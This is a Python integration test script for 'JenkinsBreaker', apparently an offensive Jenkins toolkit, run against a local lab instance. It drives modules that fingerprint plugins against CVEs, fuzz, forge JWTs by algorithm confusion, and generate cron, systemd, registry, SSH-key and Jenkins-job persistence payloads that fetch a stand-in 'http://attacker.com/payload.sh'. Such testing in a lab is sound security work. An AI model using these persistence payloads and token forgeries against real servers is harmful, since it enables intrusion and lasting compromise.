#!/usr/bin/env python3
"""
Integration tests for all JenkinsBreaker modules
Tests against Jenkins Lab running at localhost:8080
"""

import sys
import json
import time
import requests
from rich.console import Console
from rich.table import Table

console = Console()

JENKINS_URL = "http://localhost:8080"
USERNAME = "admin"
PASSWORD = "admin"

def test_jenkins_connectivity():
    """Test basic connectivity to Jenkins lab"""
    console.print("[cyan][*] Testing Jenkins connectivity...[/cyan]")
    try:
        resp = requests.get(JENKINS_URL, timeout=5)
        version = resp.headers.get('X-Jenkins', 'Unknown')
        console.print(f"[green][PASS] Connected to Jenkins {version}[/green]")
        return True
    except Exception as e:
        console.print(f"[red][FAIL] Cannot connect to Jenkins: {e}[/red]")
        return False

def test_plugin_fingerprint():
    """Test plugin fingerprinting module"""
    console.print("\n[cyan][*] Testing Plugin Fingerprint Engine...[/cyan]")
    try:
        from plugin_fingerprint import PluginFingerprint
        
        fp = PluginFingerprint(JENKINS_URL, USERNAME, PASSWORD)
        
        plugins = fp.enumerate_plugins()
        if not plugins:
            console.print("[yellow][WARN] No plugins enumerated via API[/yellow]")
        else:
            console.print(f"[green][PASS] Enumerated {len(plugins)} plugins[/green]")
        
        fp.passive_fingerprint()
        fp.active_fingerprint()
        
        vulns = fp.correlate_cves()
        console.print(f"[green][PASS] Found {len(vulns)} vulnerabilities[/green]")
        
        recommendations = fp.generate_exploit_recommendations()
        console.print(f"[green][PASS] Generated {len(recommendations)} exploit recommendations[/green]")
        
        fp.export_results("test_plugin_fingerprint.json")
        console.print("[green][PASS] Plugin fingerprinting module functional[/green]")
        return True
        
    except Exception as e:
        console.print(f"[red][FAIL] Plugin fingerprinting test failed: {e}[/red]")
        return False

def test_jenkinsfuzzer():
    """Test JenkinsFuzzer module"""
    console.print("\n[cyan][*] Testing JenkinsFuzzer...[/cyan]")
    try:
        from jenkinsfuzzer import JenkinsFuzzer
        
        fuzzer = JenkinsFuzzer(JENKINS_URL, USERNAME, PASSWORD)
        
        results = fuzzer.fuzz_all()
        
        total_findings = sum(len(findings) for findings in results.values())
        console.print(f"[green][PASS] Fuzzing complete - {total_findings} findings[/green]")
        
        fuzzer.export_results("test_fuzzer_results.json")
        console.print("[green][PASS] JenkinsFuzzer module functional[/green]")
        return True
        
    except Exception as e:
        console.print(f"[red][FAIL] JenkinsFuzzer test failed: {e}[/red]")
        return False

def test_jwt_breaker():
    """Test JWT Breaker module"""
    console.print("\n[cyan][*] Testing JWT Breaker...[/cyan]")
    try:
        from jwt_breaker import JWTBreaker
        
        breaker = JWTBreaker(JENKINS_URL, USERNAME, PASSWORD)
        
        sample_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        
        analysis = breaker.analyze_token(sample_token)
        if analysis:
            console.print("[green][PASS] Token analysis successful[/green]")
        
        forged = breaker.algorithm_confusion_attack(sample_token)
        console.print(f"[green][PASS] Generated {len(forged)} algorithm confusion tokens[/green]")
        
        breaker.export_findings("test_jwt_findings.json")
        console.print("[green][PASS] JWT Breaker module functional[/green]")
        return True
        
    except Exception as e:
        console.print(f"[red][FAIL] JWT Breaker test failed: {e}[/red]")
        return False

def test_persistence():
    """Test Persistence Manager module"""
    console.print("\n[cyan][*] Testing Persistence Manager...[/cyan]")
    try:
        from persistence import PersistenceManager
        
        pm = PersistenceManager(JENKINS_URL, USERNAME, PASSWORD)
        
        callback_url = "http://attacker.com/payload.sh"
        
        cron = pm.generate_cron_persistence(callback_url)
        console.print("[green][PASS] Cron persistence generated[/green]")
        
        systemd = pm.generate_systemd_service(callback_url)
        console.print("[green][PASS] Systemd service generated[/green]")
        
        registry = pm.generate_windows_registry_persistence(callback_url)
        console.print("[green][PASS] Windows registry persistence generated[/green]")
        
        ssh_key = pm.generate_ssh_key_persistence("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ test@test")
        console.print("[green][PASS] SSH key persistence generated[/green]")
        
        shell = pm.generate_startup_script_persistence(callback_url)
        console.print("[green][PASS] Shell profile persistence generated[/green]")
        
        task = pm.generate_scheduled_task_persistence(callback_url)
        console.print("[green][PASS] Scheduled task persistence generated[/green]")
        
        job = pm.generate_jenkins_job_persistence(callback_url)
        console.print("[green][PASS] Jenkins job persistence generated[/green]")
        
        pm.export_payloads("test_persistence_payloads.json")
        console.print("[green][PASS] Persistence Manager module functional[/green]")
        return True
        
    except Exception as e:
        console.print(f"[red][FAIL] Persistence Manager test failed: {e}[/red]")
        return False

def test_web_ui_import():
    """Test Web UI module import"""
    console.print("\n[cyan][*] Testing Web UI module import...[/cyan]")
    try:
        from web_ui import app, ConnectionManager, TargetConfig, ExploitRequest
        
        console.print("[green][PASS] Web UI module imports successful[/green]")
        console.print("[green][PASS] FastAPI app instance created[/green]")
        console.print("[green][PASS] Web UI module functional[/green]")
        return True
        
    except Exception as e:
        console.print(f"[red][FAIL] Web UI import test failed: {e}[/red]")
        return False

def test_tui_import():
    """Test TUI module import"""
    console.print("\n[cyan][*] Testing TUI module import...[/cyan]")
    try:
        from tui import JenkinsBreakerTUI, TargetInfo, ExploitLog, CVETable
        
        console.print("[green][PASS] TUI module imports successful[/green]")
        console.print("[green][PASS] TUI classes instantiable[/green]")
        console.print("[green][PASS] TUI module functional[/green]")
        return True
        
    except Exception as e:
        console.print(f"[red][FAIL] TUI import test failed: {e}[/red]")
        return False

def cleanup_test_files():
    """Remove test output files"""
    import os
    test_files = [
        "test_plugin_fingerprint.json",
        "test_fuzzer_results.json",
        "test_jwt_findings.json",
        "test_persistence_payloads.json"
    ]
    
    for f in test_files:
        try:
            if os.path.exists(f):
                os.remove(f)
        except:
            pass

def main():
    console.print("\n[bold cyan]===== JenkinsBreaker Integration Tests =====[/bold cyan]\n")
    
    results = {}
    
    results["connectivity"] = test_jenkins_connectivity()
    
    if not results["connectivity"]:
        console.print("\n[red][FAIL] Jenkins lab not running. Start with: cd jenkins-lab && docker-compose up -d[/red]")
        sys.exit(1)
    
    results["plugin_fingerprint"] = test_plugin_fingerprint()
    results["jenkinsfuzzer"] = test_jenkinsfuzzer()
    results["jwt_breaker"] = test_jwt_breaker()
    results["persistence"] = test_persistence()
    results["web_ui"] = test_web_ui_import()
    results["tui"] = test_tui_import()
    
    console.print("\n[bold cyan]===== Test Summary =====[/bold cyan]\n")
    
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Module", style="cyan")
    table.add_column("Status", style="green")
    
    for module, passed in results.items():
        status = "[green]PASS[/green]" if passed else "[red]FAIL[/red]"
        table.add_row(module.replace('_', ' ').title(), status)
    
    console.print(table)
    
    total = len(results)
    passed = sum(1 for v in results.values() if v)
    
    console.print(f"\n[bold]Results: {passed}/{total} tests passed[/bold]")
    
    cleanup_test_files()
    
    if passed == total:
        console.print("[green]All tests passed![/green]\n")
        sys.exit(0)
    else:
        console.print(f"[red]{total - passed} tests failed[/red]\n")
        sys.exit(1)

if __name__ == "__main__":
    main()
